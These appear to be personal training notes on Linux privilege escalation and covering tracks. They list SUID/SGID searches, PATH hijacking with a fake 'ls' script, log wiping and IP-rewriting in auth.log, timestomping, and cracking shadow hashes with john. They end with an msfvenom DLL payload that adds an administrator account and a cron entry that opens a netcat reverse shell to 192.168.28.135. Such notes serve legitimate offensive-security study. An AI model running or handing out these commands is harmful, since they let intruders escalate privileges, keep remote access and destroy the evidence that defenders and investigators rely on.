#### ENUMERATION FOR PRIVILEGE ESCALATION
  - What are your techniques and processes?
  - Any particular order?
  - Anything else you should be doing while on the box?
---
#### Sudo
  - `sudo -l` to check what commands the current user can sudo
---
#### SUID/SGID
  - lets you run something as a specific user or specific group
  - can abuse for your own convenience
  - `find / -type f -perm /4000 2>/dev/null`
    - finds files with SUID bit set
    - can search the files in GTFObins
  - `find / -type f -perm /2000 2>/dev/null`
    - finds files with SGID bit set
  - can do /6000, but be careful cuz can not work right sometimes or something idk
---
#### Unsecure Permissions
  - Cron
  - World Writable files and directories (any authorized user can write to (/tmp is a good one))
  - Dot '.' in the path
    - if dot in the path, can make a script that be like 
      ```bash
      #!bin/bash
      whoami > whoami.txt
      ```
    - `vim ls`
      - makes file called ls so when ls command is run it doesn't actually do ls, it does whoami and puts it into         whoami.txt
      
---
#### Vulnerable software and services
  - non-native 3rd party programs and stuff
    - buffer overflow type shit
      -  unless you can't buffer overflow, then you gotta analyze it and be a creative analyst to exploit
      -  fuck
---
#### Logs
Logs typically housed in /var/log, some useful logs:
  - lastlog --- each users successful login time
  - btmp --- tracks bad login attempts
  - secure --- Syslog
  - sulog --- use of su command
  - utmp --- users currently on (w)                 (hard to clean
  - wtmp --- permanent record on user on/off        (hard to clean)
  - auth.log/secure --- tracks usage of authorization

Cleaning the logs, basic
  - Just get rid of it
    - rm -rf (/path/file)
  - Blank it
    - cat /dev/null > (/path/file)
    - echo > /var/log/btmp

Cleaning the logs, precision
  - Always work off a backup
  - `egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2 +
cp auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log +`
    - brain flexing 
   
Timestomp 
  - Easy with Nix vs Windows, native change of Access & Modify times
    - `touch -c -t 201603051015 1.txt`
    - `touch -r 3.txt 1.txt`
    - NOTE: Change time requires changing the system time than touch the file. Could cause serious issues
---
#### Rsyslog
- Newer Rsyslog call /etc/rsyslog.d/* for settings/rules
- Older uses /etc/rsyslog.conf
  - To find out:
    - `grep "IncludeConfig" /etc/rsyslog.conf`
---
`sudo apt install john`
  - copy hashes from shadow file into a .txt 
  - john passwords.txt --wordlist=rockyou.txt
    - wont crack another password again, have to do `john passwords.txt --show`
    - **IF U GET CREDENTIALS, PUT THEM IN YOUR OPNOTES**



proxychains scp comrade@192.168.28.27:/tmp/10-milli.txt .


msfvenom -p windows/exec CMD='cmd.exe /C "net localgroup Administrators comrade /add"' -f dll > hijackmeplz.dll



`crontab -e`
  - `* * * * * nc 192.168.28.135 33403 -e /bin/bash`




















